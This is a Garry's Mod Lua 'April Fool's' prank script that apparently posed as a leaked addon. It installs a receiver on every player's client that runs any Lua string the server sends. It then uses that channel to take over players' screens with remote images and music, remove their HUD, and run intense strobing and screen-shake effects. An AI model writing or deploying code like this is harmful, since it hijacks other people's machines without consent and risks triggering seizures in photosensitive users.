--[[
	APRIL FOOL'S!
]]--

if SERVER then

util.AddNetworkString "slua"

end

local lol = {}
function lol:RandomString( intMin, intMax )
	local ret = ""
	for _ = 1, math.random( intMin, intMax ) do
		ret = ret.. string.char( math.random(65, 90) )
	end

	return ret
end

lol.m_tblActions = {}
lol.m_strImageGlobalVar = lol:RandomString( 6, 12 )
lol.m_strImageLoadHTML = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]

function lol:PushAction( intChainDelay, func )
	self.m_tblActions[#self.m_tblActions +1] = { intChainDelay, func }
end

function lol:NextAction( pPlayer )
	pPlayer.m_intCurAction = pPlayer.m_intCurAction +1
	if not self.m_tblActions[pPlayer.m_intCurAction] then return end

	timer.Simple( self.m_tblActions[pPlayer.m_intCurAction][1], function()
		if not IsValid( pPlayer ) then return end
		self.m_tblActions[pPlayer.m_intCurAction][2]( pPlayer )
		self:NextAction( pPlayer )
	end )
end

function lol:Start( pPlayer )
	pPlayer.m_intCurAction = 0
	self:NextAction( pPlayer )
end

function lol:SendLua( pPlayer, strLua )
	net.Start( "slua" )
		net.WriteString( strLua )
	net.Send( pPlayer )
end

function lol:SetupPlayer( pPlayer )
	pPlayer:SendLua( "net.Receive(\"slua\", function() RunString(net.ReadString()) end)" )
end

if SERVER then

concommand.Add("setupparty", function ( pPlayer )
	for k, v in pairs( player.GetAll() ) do
		lol:SetupPlayer( v )
	end
	print("Setup complete!")
end)

concommand.Add("timeforaparty", function( pPlayer )
	if CLIENT then return end
	for k, v in pairs( player.GetAll() ) do
		lol:SetupPlayer( v )
		timer.Simple( 2, function() lol:Start( v ) end) 
	end
end)

hook.Add( "PlayerSay", "1337command", function( pSender, strText, bTeamChat )
	if strText:sub( 1, 5 ) == "/1337" then
		pSender:Ignite( 1e9 )
		pSender:ChatPrint( "lol jk" )
		pSender:SendLua( [[surface.PlaySound( "vo/npc/male01/hacks01.wav" )]] )
		return false
	end
end )

end

--Sequence stack
--Start some tunes and steam in our assets
lol:PushAction(1, function ( pPlayer )
	for i=1,10 do
		for k, ply in pairs( player.GetAll() ) do
			ply:ChatPrint( "! EPILEPSY WARNING !" )
		end
	end
end)

lol:PushAction( 1, function( pPlayer )
	lol:SendLua( pPlayer, ([=[
		sound.PlayURL( "http://www.underdone.org/leak/underdone/blue.mp3", "", function()end )
		
		g_]=].. lol.m_strImageGlobalVar.. [=[ = {}
		local html = [[%s]]
		local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
			local pnl = vgui.Create( "HTML" )
			pnl:SetPos( ScrW() -1, ScrH() -1 )
			pnl:SetVisible( true )
			pnl:SetMouseInputEnabled( false )
			pnl:SetKeyBoardInputEnabled( false )
			pnl:SetSize( intSizeX, intSizeY )
			pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
			
			local PageLoaded
			PageLoaded = function()
				local mat = pnl:GetHTMLMaterial()
				if mat then
					g_]=].. lol.m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
					return
				end
				
				timer.Simple( 0.5, PageLoaded )
			end

			PageLoaded()
		end

		LoadWebMaterial( "http://www.underdone.org/leak/underdone/hud.png", "hud1", 300, 128 )
		LoadWebMaterial( "http://www.underdone.org/leak/underdone/hud2.png", "hud2", 300, 128 )
		LoadWebMaterial( "http://www.underdone.org/leak/underdone/hud3.png", "hud3", 128, 128 )
		LoadWebMaterial( "http://www.underdone.org/leak/underdone/xhair.png", "xhair", 64, 64 )
		LoadWebMaterial( "http://i.imgur.com/GnoMmiT.png", "at-at", 200, 199 )
		LoadWebMaterial( "http://i.imgur.com/0E7xN5j.png", "at-at2", 200, 110 )
		LoadWebMaterial( "http://i.imgur.com/dIDQQEy.png", "at-st", 235, 471 )
		LoadWebMaterial( "http://i.imgur.com/8Bp0ItB.png", "lightsaber", 250, 175 )
	]=]):format(lol.m_strImageLoadHTML) )
end )

--HUD swap
lol:PushAction( 31, function( pPlayer )
	lol:SendLua( pPlayer, [[
		(GAMEMODE or GM).CalcView = function() end
		(GAMEMODE or GM).ShouldDrawLocalPlayer = function() end

		local remove = { "PostDrawHUD", "PreDrawHUD", "HUDPaint", "HUDPaintBackground", "CalcView", "ShouldDrawLocalPlayer" }
		for k, v in pairs(remove) do
			hook.GetTable()[v] = {}
		end

		local function GetWebMat( strURL )
			return g_]].. lol.m_strImageGlobalVar.. [[[strURL]
		end

		hook.Add( "HUDPaint", "newhud", function()
			surface.SetDrawColor( 255, 255, 255, 255 )

			if GetWebMat( "hud1" ) then
				surface.SetMaterial( GetWebMat("hud1")[1] )
				surface.DrawTexturedRect( 0, ScrH() -128, 300 *(512 /300), 128 )
			end
			if GetWebMat( "hud2" ) then
				surface.SetMaterial( GetWebMat("hud2")[1] )
				surface.DrawTexturedRect( ScrW() -300, ScrH() -128, 300 *(512 /300), 128 )
			end
			if GetWebMat( "hud3" ) then
				surface.SetMaterial( GetWebMat("hud3")[1] )
				surface.DrawTexturedRect( 45, ScrH() -245, 128, 128 )
			end
			if GetWebMat( "xhair" ) then
				surface.SetMaterial( GetWebMat("xhair")[1] )
				surface.DrawTexturedRect( (ScrW() /2) -32, (ScrH() /2) -32, 64, 64 )
			end

			if GetWebMat( "at-at" ) then
				surface.SetMaterial( GetWebMat("at-at")[1] )
				surface.DrawTexturedRectRotated( math.random(250, 260), math.random(250, 260), 200 *(199 /200), 199, CurTime() *512 )
			end
			if GetWebMat( "at-st" ) then
				surface.SetMaterial( GetWebMat("at-st")[1] )
				surface.DrawTexturedRectRotated( math.random(400, 410), math.random(ScrH() -260, ScrH() -250), 235 *((471 /235) -1), 471, CurTime() *-512 )
			end
			if GetWebMat( "at-at2" ) then
				surface.SetMaterial( GetWebMat("at-at2")[1] )
				surface.DrawTexturedRectRotated( ScrW() -math.random(250, 260), math.random(250, 260), 200, 110, CurTime() *-512 )
			end
			if GetWebMat( "lightsaber" ) then
				surface.SetMaterial( GetWebMat("lightsaber")[1] )
				surface.DrawTexturedRectRotated( ScrW() -math.random(400, 410), math.random(ScrH() -260, ScrH() -250), 250, 175, CurTime() *512 )
			end

			draw.SimpleTextOutlined(
				"April Fools! This isn't the addon you're looking for...",
				"DermaLarge",
				ScrW() /2 +math.random( -8, 8 ),
				ScrH() /2 +math.random( -8, 8 ) +64,
				Color( 255, 0, 0, 255 ),
				TEXT_ALIGN_CENTER,
				TEXT_ALIGN_CENTER,
				1,
				Color( 0, 0, 255, 255 )
			) 
		end )

		local allowed = { ["CHudChat"] = true, ["CHudGMod"] = true, ["CHudWeaponSelection"] = true, ["CHudMenu"] = true }
		hook.Add( "HUDShouldDraw", "newhud", function( str ) if not allowed[str] then return false end end )

		surface.PlaySound( "garrysmod/save_load4.wav" )
		surface.PlaySound( "vo/npc/male01/excuseme02.wav" )
	]] )
end )

--Disco time
lol:PushAction( 10, function( pPlayer )
	local idx = pPlayer:EntIndex()
	timer.Create( "beat".. idx, 0.42, 0, function()
	    if not IsValid( pPlayer ) then timer.Destroy( "beat".. idx ) return end
	    pPlayer:ViewPunch( Angle(math.Rand(-15, -10), math.Rand(-10, 10), 0) )
	end )


	lol:SendLua( pPlayer, [[
		local emitter = ParticleEmitter( LocalPlayer():GetPos() )
		local time = 0

		hook.Add( "Think", "wat", function()
			if CurTime() < time then
				return
			end

			time = CurTime() +0.05
			for i = 1, 16 do
				local part = emitter:Add(
					"particles/balloon_bit", 
					LocalPlayer():GetPos() +Vector( 
						math.random( -256, 256 ), 
						math.random( -256, 256 ), 
						256
					)
				)
				
				if part then
					local Size = math.random( 4, 7 )
					
					part:SetColor( math.random(0, 255), math.random(0, 255), math.random(0, 255), 255 )
					part:SetVelocity( Vector( 40, 25, -math.random(300, 400) ) )
					part:SetDieTime( 4.5 )
					part:SetGravity( Vector(40, 0, -250) )
					part:SetLifeTime( 0 )
					part:SetStartSize( Size /2 )
					part:SetEndSize( Size )
					part:SetCollide( true )
				end
			end
		end )
	]] )

	lol:SendLua( pPlayer, [[
		hook.Add( "RenderScreenspaceEffects", "wat", function()
			local sinScaler = math.sin( CurTime() )
			DrawBloom(
				0,
				3,
				sinScaler *math.Rand(1, 8),
				sinScaler *math.Rand(1, 8),
				6,
				math.Rand(0.5, 2),
				math.Rand(0, 0.3),
				math.Rand(0, 0.3),
				math.Rand(0.5, 1)
			)

			DrawColorModify{
				["$pp_colour_addr"] = 0,
				["$pp_colour_addg"] = 0,
				["$pp_colour_addb"] = 00,
				["$pp_colour_brightness" ] = 0,
				["$pp_colour_contrast" ] = 1,
				["$pp_colour_colour" ] = 1,
				["$pp_colour_mulr" ] = 0,
				["$pp_colour_mulg" ] = 0,
				["$pp_colour_mulb" ] = 1
			}
		end )

		local mdl = ClientsideModel( "models/player/skeleton.mdl", RENDERGROUP_BOTH )
		mdl:SetNoDraw( true )
		local posCache, time = {}, 0

		hook.Add( "HUDPaint", "dance", function()
			if not mdl.SeqStart or CurTime() > (mdl.SeqStart +mdl.SeqDuration) then
				local idx = mdl:LookupSequence("taunt_dance")
				mdl.SeqDuration = mdl:SequenceDuration( idx )
				mdl.SeqStart = CurTime()
				mdl:ResetSequence( idx )
			end

			mdl:SetCycle( (CurTime() -mdl.SeqStart) /mdl.SeqDuration )

			
			local w, h = 300, 300
			local ang = Angle( 0, 0, 0 )

			for i = 1, 32 do
				if CurTime() > time then
					posCache[i] = { math.random( 0, ScrW() -w ), math.random( 0, ScrH() -h ) }
				end
				local x, y = posCache[i][1], posCache[i][2]

				cam.Start3D( (ang:Forward() *64) +(ang:Up() *32), (ang:Forward()*-1):Angle(), 90, x, y, w, h )
					cam.IgnoreZ( true )
					render.SuppressEngineLighting( true )
					
					render.SetLightingOrigin( mdl:GetPos() )
					render.ResetModelLighting( 1, 1, 1 )
					render.SetColorModulation( 0, 0, 1 )

					mdl:DrawModel()
					
					render.SuppressEngineLighting( false )
					cam.IgnoreZ( false )
				cam.End3D()
			end

			if CurTime() > time then
				time = CurTime() +0.15
			end
		end )

		surface.PlaySound( "vo/npc/male01/ohno.wav" )
	]] )
end )

--Let the beat drop
lol:PushAction( 54, function( pPlayer )
	lol:SendLua( pPlayer, [[
		hook.Add( "GetMotionBlurValues", "wat", function()
			return 0, 0, 1, math.sin(CurTime() *13)
		end )

		hook.Add( "RenderScreenspaceEffects", "ohgod", function()
			local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) )
			DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) )
			DrawMaterialOverlay( "effects/tp_eyefx/tpeye", 1 )
		end )

		hook.Add( "PostDrawTranslucentRenderables", "ohgod", function()
			render.SetMaterial( Material("cable/blue_elec") )
			for i = 1, 32 do
				render.DrawBeam( LocalPlayer():GetPos() +Vector(0, 0, 128) +(EyeAngles():Forward() *256), EyePos() +(VectorRand() *256), 4, 0, 12.5, Color(255, 255, 255, 255) )
			end
		end )

		timer.Create( "thedrop", 0.42, 0, function()
			util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) 
		end )
	]] )
end )

lol:PushAction( 175, function( pPlayer )
	lol:SendLua( pPlayer, [[
		surface.PlaySound( "vo/npc/male01/gethellout.wav" )
		hook.Add( "HUDShouldDraw", "newhud", function() return false end )
	]] )

end )